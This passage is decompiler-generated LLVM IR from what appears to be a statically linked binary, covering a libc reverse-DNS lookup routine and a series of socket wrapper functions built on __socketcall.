  %v0_1001e6ac = load i32, i32* @r27, align 4
  %v3_1001e6ac = icmp eq i32 %v0_1001e6ac, 4
  br i1 %v3_1001e6ac, label %dec_label_pc_1001e6bc, label %dec_label_pc_1001e94c

dec_label_pc_1001e6b8:                            ; preds = %dec_label_pc_1001e6a0
  %v0_1001e6b4 = load i32, i32* @r27, align 4
  %v3_1001e6b4 = icmp eq i32 %v0_1001e6b4, 16
  br i1 %v3_1001e6b4, label %dec_label_pc_1001e6bc, label %dec_label_pc_1001e94c

dec_label_pc_1001e6bc:                            ; preds = %dec_label_pc_1001e6ac, %dec_label_pc_1001e6b8
  %v0_1001e6c0 = phi i32 [ 4, %dec_label_pc_1001e6ac ], [ 16, %dec_label_pc_1001e6b8 ]
  %v0_1001e6bc = load i32, i32* @r28, align 4
  store i32 %v0_1001e6bc, i32* %r3.global-to-local, align 4
  %v0_1001e6c8 = load i32, i32* @r26, align 4
  %v0_1001e6cc = load i32, i32* @r31, align 4
  %v0_1001e6d0 = load i32, i32* @r29, align 4
  %v0_1001e6d4 = load i32, i32* %r19.global-to-local, align 4
  %v0_1001e6d8 = load i32, i32* @r25, align 4
  store i32 %v0_1001e6d8, i32* @r10, align 4
  store i32 268560096, i32* @lr, align 4
  %v8_1001e6dc = call i32 @__get_hosts_byaddr_r(i32 %v0_1001e6bc, i32 %v0_1001e6c0, i32 %v0_1001e698, i32 %v0_1001e6c8, i32 %v0_1001e6cc, i32 %v0_1001e6d0, i32 %v0_1001e6d4)
  store i32 %v8_1001e6dc, i32* %r3.global-to-local, align 4
  %v3_1001e6e0 = icmp eq i32 %v8_1001e6dc, 0
  br i1 %v3_1001e6e0, label %dec_label_pc_1001e970, label %dec_label_pc_1001e6e8

dec_label_pc_1001e6e8:                            ; preds = %dec_label_pc_1001e6bc
  %v0_1001e6e8 = load i32, i32* @r25, align 4
  %v1_1001e6e8 = inttoptr i32 %v0_1001e6e8 to i32*
  %v2_1001e6e8 = load i32, i32* %v1_1001e6e8, align 4
  store i32 %v2_1001e6e8, i32* %r0.global-to-local, align 4
  %v3_1001e6ec = icmp eq i32 %v2_1001e6e8, 1
  br i1 %v3_1001e6ec, label %dec_label_pc_1001e6fc, label %dec_label_pc_1001e6f4

dec_label_pc_1001e6f4:                            ; preds = %dec_label_pc_1001e6e8
  %v3_1001e6f4 = icmp eq i32 %v2_1001e6e8, 4
  br i1 %v3_1001e6f4, label %dec_label_pc_1001e6fc, label %dec_label_pc_1001e970

dec_label_pc_1001e6fc:                            ; preds = %dec_label_pc_1001e6f4, %dec_label_pc_1001e6e8
  store i32 268560128, i32* @lr, align 4
  %v0_1001e6fc = call i32 @__open_nameservers()
  store i32 %v0_1001e6fc, i32* %r3.global-to-local, align 4
  %v0_1001e700 = load i32, i32* @r29, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1001e708 = load i32, i32* @r25, align 4
  %v2_1001e708 = inttoptr i32 %v1_1001e708 to i32*
  store i32 -1, i32* %v2_1001e708, align 4
  %tmp25 = icmp ult i32 %v0_1001e700, 4
  br i1 %tmp25, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e710

dec_label_pc_1001e710:                            ; preds = %dec_label_pc_1001e6fc
  %v0_1001e710 = load i32, i32* @r29, align 4
  %v1_1001e710 = add i32 %v0_1001e710, -4
  store i32 %v1_1001e710, i32* %r0.global-to-local, align 4
  %tmp26 = icmp ult i32 %v1_1001e710, 8
  br i1 %tmp26, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e71c

dec_label_pc_1001e71c:                            ; preds = %dec_label_pc_1001e710
  %v1_1001e71c = add i32 %v0_1001e710, -12
  store i32 %v1_1001e71c, i32* %r0.global-to-local, align 4
  %tmp27 = icmp ult i32 %v1_1001e71c, 32
  br i1 %tmp27, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e728

dec_label_pc_1001e728:                            ; preds = %dec_label_pc_1001e71c
  %tmp28 = icmp ult i32 %v0_1001e710, 16
  br i1 %tmp28, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e730

dec_label_pc_1001e730:                            ; preds = %dec_label_pc_1001e728
  %v1_1001e730 = add i32 %v0_1001e710, -16
  store i32 %v1_1001e730, i32* %r0.global-to-local, align 4
  %tmp29 = icmp ult i32 %v1_1001e730, 8
  br i1 %tmp29, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e73c

dec_label_pc_1001e73c:                            ; preds = %dec_label_pc_1001e730
  %v1_1001e73c = add i32 %v0_1001e710, -24
  store i32 %v1_1001e73c, i32* %r0.global-to-local, align 4
  %v1_1001e740 = add i32 %v0_1001e710, -44
  store i32 %v1_1001e740, i32* @r24, align 4
  %v3_1001e744 = icmp ugt i32 %v1_1001e73c, %v1_1001e740
  %v0_1001e748 = load i32, i32* @r31, align 4
  %v1_1001e748 = add i32 %v0_1001e748, 4
  store i32 %v1_1001e748, i32* %r20.global-to-local, align 4
  %v1_1001e74c = add i32 %v0_1001e748, 12
  store i32 %v1_1001e74c, i32* @r21, align 4
  %v1_1001e750 = add i32 %v0_1001e748, 16
  store i32 %v1_1001e750, i32* %r23.global-to-local, align 4
  %v1_1001e754 = add i32 %v0_1001e748, 44
  store i32 %v1_1001e754, i32* @r30, align 4
  br i1 %v3_1001e744, label %dec_label_pc_1001e764, label %dec_label_pc_1001e75c

dec_label_pc_1001e75c:                            ; preds = %dec_label_pc_1001e73c
  store i32 %v1_1001e73c, i32* @r24, align 4
  %v1_1001e760 = add i32 %v0_1001e748, 24
  store i32 %v1_1001e760, i32* @r30, align 4
  br label %dec_label_pc_1001e764

dec_label_pc_1001e764:                            ; preds = %dec_label_pc_1001e73c, %dec_label_pc_1001e75c
  %v0_1001e764 = phi i32 [ %v1_1001e73c, %dec_label_pc_1001e75c ], [ %v1_1001e740, %dec_label_pc_1001e73c ]
  %tmp30 = icmp ult i32 %v0_1001e764, 256
  br i1 %tmp30, label %dec_label_pc_1001e96c, label %dec_label_pc_1001e76c

dec_label_pc_1001e76c:                            ; preds = %dec_label_pc_1001e764
  %v0_1001e76c = load i32, i32* @r22, align 4
  %v3_1001e76c = icmp eq i32 %v0_1001e76c, 2
  br i1 %v3_1001e76c, label %dec_label_pc_1001e774, label %dec_label_pc_1001e7b0

dec_label_pc_1001e774:                            ; preds = %dec_label_pc_1001e76c
  %v0_1001e774 = load i32, i32* @r27, align 4
  store i32 %v0_1001e774, i32* @r5, align 4
  %v0_1001e778 = load i32, i32* @r28, align 4
  store i32 %v0_1001e778, i32* @r4, align 4
  store i32 %v0_1001e748, i32* @r3, align 4
  store i32 268560260, i32* @lr, align 4
  %v0_1001e780 = call i32 @memcpy()
  %v0_1001e784 = load i32, i32* @r31, align 4
  %v1_1001e784 = load i32, i32* %r20.global-to-local, align 4
  %v2_1001e784 = inttoptr i32 %v1_1001e784 to i32*
  store i32 %v0_1001e784, i32* %v2_1001e784, align 4
  %v0_1001e78c = load i32, i32* @r30, align 4
  store i32 %v0_1001e78c, i32* @r3, align 4
  %v0_1001e790 = load i32, i32* @r28, align 4
  %v1_1001e790 = inttoptr i32 %v0_1001e790 to i8*
  %v2_1001e790 = load i8, i8* %v1_1001e790, align 1
  %v3_1001e790 = zext i8 %v2_1001e790 to i32
  store i32 %v3_1001e790, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1001e7ac.1223 to i32), i32* @lr, align 4
  %v1_1001e7a8 = call i32 @sprintf(i32 %v0_1001e78c)
  br label %dec_label_pc_1001e80c

dec_label_pc_1001e7b0:                            ; preds = %dec_label_pc_1001e76c
  %v0_1001e7b0 = load i32, i32* @r28, align 4
  store i32 %v0_1001e7b0, i32* @r4, align 4
  store i32 %v0_1001e748, i32* @r3, align 4
  %v0_1001e7b8 = load i32, i32* @r27, align 4
  store i32 %v0_1001e7b8, i32* @r5, align 4
  %v1_1001e7bc = add i32 %v0_1001e7b8, -1
  store i32 %v1_1001e7bc, i32* %r29.global-to-local, align 4
  store i32 268560324, i32* @lr, align 4
  %v0_1001e7c0 = call i32 @memcpy()
  %v0_1001e7c4 = load i32, i32* @r30, align 4
  store i32 %v0_1001e7c4, i32* %r28.global-to-local, align 4
  %v0_1001e7c8 = load i32, i32* @r31, align 4
  %v1_1001e7c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001e7c8 = inttoptr i32 %v1_1001e7c8 to i32*
  store i32 %v0_1001e7c8, i32* %v2_1001e7c8, align 4
  %v0_1001e7ec4 = load i32, i32* %r29.global-to-local, align 4
  %v0_1001e7f88 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001e7f88, i32* @r3, align 4
  %tmp31 = icmp sgt i32 %v0_1001e7ec4, -1
  br i1 %tmp31, label %dec_label_pc_1001e7d0, label %dec_label_pc_1001e800

dec_label_pc_1001e7d0:                            ; preds = %dec_label_pc_1001e7b0, %dec_label_pc_1001e7d0
  %v1_1001e7d0 = phi i32 [ %v0_1001e7ec, %dec_label_pc_1001e7d0 ], [ %v0_1001e7ec4, %dec_label_pc_1001e7b0 ]
  %v0_1001e7f89 = phi i32 [ %v2_1001e7e8, %dec_label_pc_1001e7d0 ], [ %v0_1001e7f88, %dec_label_pc_1001e7b0 ]
  %v1_1001e7d4 = add i32 %v1_1001e7d0, -1
  store i32 %v1_1001e7d4, i32* %r29.global-to-local, align 4
  store i32 268560360, i32* @lr, align 4
  %v1_1001e7e4 = call i32 @sprintf(i32 %v0_1001e7f89)
  %v0_1001e7e8 = load i32, i32* @r28, align 4
  %v2_1001e7e8 = add i32 %v0_1001e7e8, %v1_1001e7e4
  store i32 %v2_1001e7e8, i32* %r28.global-to-local, align 4
  %v0_1001e7ec = load i32, i32* @r29, align 4
  store i32 %v2_1001e7e8, i32* @r3, align 4
  %tmp32 = icmp sgt i32 %v0_1001e7ec, -1
  br i1 %tmp32, label %dec_label_pc_1001e7d0, label %dec_label_pc_1001e800

dec_label_pc_1001e800:                            ; preds = %dec_label_pc_1001e7d0, %dec_label_pc_1001e7b0
  %v0_1001e7f8.lcssa = phi i32 [ %v0_1001e7f88, %dec_label_pc_1001e7b0 ], [ %v2_1001e7e8, %dec_label_pc_1001e7d0 ]
  %v4_1001e808 = call i32 @strcpy(i32 %v0_1001e7f8.lcssa, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002f0c8.1225, i32 0, i32 0))
  br label %dec_label_pc_1001e80c

dec_label_pc_1001e80c:                            ; preds = %dec_label_pc_1001e774, %dec_label_pc_1001e800
  %storemerge = phi i32 [ %v4_1001e808, %dec_label_pc_1001e800 ], [ %v1_1001e7a8, %dec_label_pc_1001e774 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_1001e814 = load i32, i32* %r20.global-to-local, align 4
  %v2_1001e814 = add i32 %v1_1001e814, 4
  %v3_1001e814 = inttoptr i32 %v2_1001e814 to i32*
  store i32 0, i32* %v3_1001e814, align 4
  %v0_1001e818 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e818 = load i32, i32* @r21, align 4
  %v2_1001e818 = add i32 %v1_1001e818, 4
  %v3_1001e818 = inttoptr i32 %v2_1001e818 to i32*
  store i32 %v0_1001e818, i32* %v3_1001e818, align 4
  %v0_1001e81c = load i32, i32* @r30, align 4
  %v1_1001e81c = load i32, i32* @r21, align 4
  %v2_1001e81c = inttoptr i32 %v1_1001e81c to i32*
  store i32 %v0_1001e81c, i32* %v2_1001e81c, align 4
  %v2_1001e824 = ptrtoint i32* %stack_var_-116 to i32
  %v2_1001e86c = ptrtoint i32* %stack_var_-120 to i32
  %v3_1001e8ac = icmp eq i32 %tmp18, 5
  %v0_1001e83c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001e820

dec_label_pc_1001e820:                            ; preds = %dec_label_pc_1001e8b4, %dec_label_pc_1001e80c
  %v0_1001e83c = phi i32 [ %v0_1001e8d0, %dec_label_pc_1001e8b4 ], [ %v0_1001e83c.pre, %dec_label_pc_1001e80c ]
  store i32 %v2_1001e824, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1001e824, i32* %r3.global-to-local, align 4
  %v1_1001e83c = add i32 %v0_1001e83c, 1
  store i32 %v1_1001e83c, i32* %r31.global-to-local, align 4
  %v4_1001e840 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r3.global-to-local, align 4
  store i32 268560460, i32* @lr, align 4
  %v1_1001e848 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v3_1001e850 = load i32, i32* @global_var_1004528c.1213, align 4
  store i32 %v3_1001e850, i32* @r29, align 4
  store i32 %v2_1001e824, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268560480, i32* @lr, align 4
  %v0_1001e85c = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e864 = load i32, i32* @r29, align 4
  %v0_1001e878 = load i32, i32* @r30, align 4
  store i32 %v0_1001e878, i32* %r3.global-to-local, align 4
  store i32 268560512, i32* @lr, align 4
  %v6_1001e87c = inttoptr i32 %v0_1001e878 to i8*
  %v7_1001e87c = call i32 @__dns_lookup(i8* %v6_1001e87c, i32 12, i32 %v0_1001e864, i32 ptrtoint (i32* @global_var_1004ef04.1214 to i32), i32 %v2_1001e86c, i32 %v2_1001e688)
  %v0_1001e880 = load i32, i32* @r24, align 4
  %v1_1001e884 = icmp slt i32 %v7_1001e87c, 0
  %v0_1001e888 = load i32, i32* @r30, align 4
  store i32 %v0_1001e888, i32* %r3.global-to-local, align 4
  br i1 %v1_1001e884, label %dec_label_pc_1001e954, label %dec_label_pc_1001e890

dec_label_pc_1001e890:                            ; preds = %dec_label_pc_1001e820
  %v3_1001e890 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e890, i32* @r4, align 4
  store i32 268560536, i32* @lr, align 4
  %v3_1001e894 = call i32 @strncpy(i32 %v0_1001e888, i32 %v3_1001e890, i32 %v0_1001e880)
  %v3_1001e898 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e898, i32* @r3, align 4
  store i32 268560544, i32* @lr, align 4
  %v0_1001e89c = call i32 @free()
  store i32 %v0_1001e89c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v0_1001e8a4 = load i32, i32* @r30, align 4
  %v0_1001e8a8 = load i32, i32* @r24, align 4
  br i1 %v3_1001e8ac, label %dec_label_pc_1001e8b4, label %dec_label_pc_1001e8e0

dec_label_pc_1001e8b4:                            ; preds = %dec_label_pc_1001e890
  store i32 %tmp17, i32* @r4, align 4
  %v3_1001e8b8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8b8, i32* %r3.global-to-local, align 4
  store i32 268560576, i32* @lr, align 4
  %v4_1001e8bc = call i32 @__decode_dotted(i32 %v3_1001e8b8, i32 %tmp17, i32 %v0_1001e8a4, i32 %v0_1001e8a8)
  store i32 %v4_1001e8bc, i32* @r29, align 4
  %v3_1001e8c4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8c4, i32* @r3, align 4
  store i32 268560588, i32* @lr, align 4
  %v0_1001e8c8 = call i32 @free()
  store i32 %v0_1001e8c8, i32* %r3.global-to-local, align 4
  %v0_1001e8cc = load i32, i32* @r29, align 4
  %v0_1001e8d0 = load i32, i32* @r31, align 4
  %v0_1001e8d4.not = icmp sgt i32 %v0_1001e8cc, -1
  %tmp33 = icmp slt i32 %v0_1001e8d0, 6
  %or.cond = and i1 %tmp33, %v0_1001e8d4.not
  br i1 %or.cond, label %dec_label_pc_1001e820, label %dec_label_pc_1001e960

dec_label_pc_1001e8e0:                            ; preds = %dec_label_pc_1001e890
  %v3_1001e8e0 = icmp eq i32 %tmp18, 12
  %v3_1001e8e4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8e4, i32* @r3, align 4
  br i1 %v3_1001e8e0, label %dec_label_pc_1001e8ec, label %dec_label_pc_1001e93c

dec_label_pc_1001e8ec:                            ; preds = %dec_label_pc_1001e8e0
  store i32 %tmp17, i32* @r4, align 4
  store i32 268560636, i32* @lr, align 4
  %v4_1001e8f8 = call i32 @__decode_dotted(i32 %v3_1001e8e4, i32 %tmp17, i32 %v0_1001e8a4, i32 %v0_1001e8a8)
  %v3_1001e8fc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8fc, i32* @r3, align 4
  store i32 268560644, i32* @lr, align 4
  %v0_1001e900 = call i32 @free()
  store i32 %v0_1001e900, i32* %r3.global-to-local, align 4
  %v0_1001e904 = load i32, i32* @r22, align 4
  %v3_1001e904 = icmp eq i32 %v0_1001e904, 2
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001e90c = load i32, i32* @r30, align 4
  %v1_1001e90c = load i32, i32* @r26, align 4
  %v2_1001e90c = inttoptr i32 %v1_1001e90c to i32*
  store i32 %v0_1001e90c, i32* %v2_1001e90c, align 4
  %v0_1001e910 = load i32, i32* @r22, align 4
  %v1_1001e910 = load i32, i32* @r26, align 4
  %v2_1001e910 = add i32 %v1_1001e910, 8
  %v3_1001e910 = inttoptr i32 %v2_1001e910 to i32*
  store i32 %v0_1001e910, i32* %v3_1001e910, align 4
  br i1 %v3_1001e904, label %dec_label_pc_1001e8ec.dec_label_pc_1001e91c_crit_edge, label %dec_label_pc_1001e918

dec_label_pc_1001e8ec.dec_label_pc_1001e91c_crit_edge: ; preds = %dec_label_pc_1001e8ec
  %v0_1001e91c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e91c

dec_label_pc_1001e918:                            ; preds = %dec_label_pc_1001e8ec
  store i32 16, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e91c

dec_label_pc_1001e91c:                            ; preds = %dec_label_pc_1001e8ec.dec_label_pc_1001e91c_crit_edge, %dec_label_pc_1001e918
  %v0_1001e91c = phi i32 [ %v0_1001e91c.pre, %dec_label_pc_1001e8ec.dec_label_pc_1001e91c_crit_edge ], [ 16, %dec_label_pc_1001e918 ]
  %v1_1001e91c = load i32, i32* @r26, align 4
  %v2_1001e91c = add i32 %v1_1001e91c, 12
  %v3_1001e91c = inttoptr i32 %v2_1001e91c to i32*
  store i32 %v0_1001e91c, i32* %v3_1001e91c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1001e924 = load i32, i32* @r20, align 4
  %v1_1001e924 = load i32, i32* @r26, align 4
  %v2_1001e924 = add i32 %v1_1001e924, 16
  %v3_1001e924 = inttoptr i32 %v2_1001e924 to i32*
  store i32 %v0_1001e924, i32* %v3_1001e924, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e92c = load i32, i32* @r21, align 4
  %v1_1001e92c = load i32, i32* @r26, align 4
  %v2_1001e92c = add i32 %v1_1001e92c, 4
  %v3_1001e92c = inttoptr i32 %v2_1001e92c to i32*
  store i32 %v0_1001e92c, i32* %v3_1001e92c, align 4
  %v0_1001e930 = load i32, i32* @r26, align 4
  %v1_1001e930 = load i32, i32* @r19, align 4
  %v2_1001e930 = inttoptr i32 %v1_1001e930 to i32*
  store i32 %v0_1001e930, i32* %v2_1001e930, align 4
  %v0_1001e934.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e934

dec_label_pc_1001e934:                            ; preds = %dec_label_pc_1001e960, %dec_label_pc_1001e954, %dec_label_pc_1001e93c, %dec_label_pc_1001e91c
  %v0_1001e934 = phi i32 [ 3, %dec_label_pc_1001e960 ], [ 1, %dec_label_pc_1001e954 ], [ 4, %dec_label_pc_1001e93c ], [ %v0_1001e934.pre, %dec_label_pc_1001e91c ]
  %v1_1001e934 = load i32, i32* @r25, align 4
  %v2_1001e934 = inttoptr i32 %v1_1001e934 to i32*
  store i32 %v0_1001e934, i32* %v2_1001e934, align 4
  %v0_1001e980.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e970

dec_label_pc_1001e93c:                            ; preds = %dec_label_pc_1001e8e0
  store i32 ptrtoint ([3 x i8]* @global_var_1001e940.1227 to i32), i32* @lr, align 4
  %v0_1001e93c = call i32 @free()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e934

dec_label_pc_1001e94c:                            ; preds = %dec_label_pc_1001e6ac, %dec_label_pc_1001e6b8, %dec_label_pc_1001e6a0, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e970

dec_label_pc_1001e954:                            ; preds = %dec_label_pc_1001e820
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e934

dec_label_pc_1001e960:                            ; preds = %dec_label_pc_1001e8b4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e934

dec_label_pc_1001e96c:                            ; preds = %dec_label_pc_1001e764, %dec_label_pc_1001e730, %dec_label_pc_1001e728, %dec_label_pc_1001e71c, %dec_label_pc_1001e710, %dec_label_pc_1001e6fc
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e970

dec_label_pc_1001e970:                            ; preds = %dec_label_pc_1001e6f4, %dec_label_pc_1001e6bc, %dec_label_pc_1001e94c, %dec_label_pc_1001e934, %dec_label_pc_1001e96c
  %v0_1001e980 = phi i32 [ %v8_1001e6dc, %dec_label_pc_1001e6f4 ], [ 0, %dec_label_pc_1001e6bc ], [ 22, %dec_label_pc_1001e94c ], [ %v0_1001e980.pre, %dec_label_pc_1001e934 ], [ 34, %dec_label_pc_1001e96c ]
  store i32 %v0_1001e650, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001e980

; uselistorder directives
  uselistorder i32 %v0_1001e8d0, { 1, 0 }
  uselistorder i32 %v0_1001e7ec, { 1, 0 }
  uselistorder i32 %v2_1001e7e8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001e7f88, { 1, 0, 2 }
  uselistorder i32 %v0_1001e748, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1001e710, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %tmp18, { 0, 2, 1 }
  uselistorder i32 %tmp17, { 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 2, 10, 11, 12, 13, 14, 16, 15, 1, 17, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -16, { 32, 33, 34, 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 12, 10, 13, 11, 16, 14, 17, 15, 19, 18, 22, 20, 23, 21, 25, 24, 27, 26, 29, 28, 31, 30, 35 }
  uselistorder i32 ()* @__open_nameservers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001e970, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1001e94c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001e91c, { 1, 0 }
  uselistorder label %dec_label_pc_1001e80c, { 1, 0 }
  uselistorder label %dec_label_pc_1001e7d0, { 1, 0 }
  uselistorder label %dec_label_pc_1001e764, { 1, 0 }
  uselistorder label %dec_label_pc_1001e6bc, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001e998 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560808, i32* @lr, align 4
  %v2_1001e9a4 = call i32 @__socketcall(i32 5, i32 %v2_1001e998)
  ret i32 %v2_1001e9a4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_1001e9c0 = load i32, i32* @r3, align 4
  store i32 %v0_1001e9c0, i32* %stack_var_-24, align 4
  %v2_1001e9cc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560860, i32* @lr, align 4
  %v2_1001e9d8 = call i32 @__socketcall(i32 2, i32 %v2_1001e9cc)
  ret i32 %v2_1001e9d8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ea00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560912, i32* @lr, align 4
  %v2_1001ea0c = call i32 @__socketcall(i32 3, i32 %v2_1001ea00)
  ret i32 %v2_1001ea0c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ea34 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268560972, i32* @lr, align 4
  %v2_1001ea48 = call i32 @__socketcall(i32 15, i32 %v2_1001ea34)
  ret i32 %v2_1001ea48

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ea70 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561020, i32* @lr, align 4
  %v2_1001ea78 = call i32 @__socketcall(i32 4, i32 %v2_1001ea70)
  ret i32 %v2_1001ea78

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eaa0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561076, i32* @lr, align 4
  %v2_1001eab0 = call i32 @__socketcall(i32 10, i32 %v2_1001eaa0)
  ret i32 %v2_1001eab0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ead8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268561140, i32* @lr, align 4
  %v2_1001eaf0 = call i32 @__socketcall(i32 12, i32 %v2_1001ead8)
  ret i32 %v2_1001eaf0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb18 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561192, i32* @lr, align 4
  %v2_1001eb24 = call i32 @__socketcall(i32 17, i32 %v2_1001eb18)
  ret i32 %v2_1001eb24

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb4c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561248, i32* @lr, align 4
  %v2_1001eb5c = call i32 @__socketcall(i32 9, i32 %v2_1001eb4c)
  ret i32 %v2_1001eb5c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb84 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561300, i32* @lr, align 4
  %v2_1001eb90 = call i32 @__socketcall(i32 16, i32 %v2_1001eb84)
  ret i32 %v2_1001eb90

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ebb8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268561364, i32* @lr, align 4
  %v2_1001ebd0 = call i32 @__socketcall(i32 11, i32 %v2_1001ebb8)
  ret i32 %v2_1001ebd0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ebf8 = ptrtoint i32* %stack_var_-40 to i32
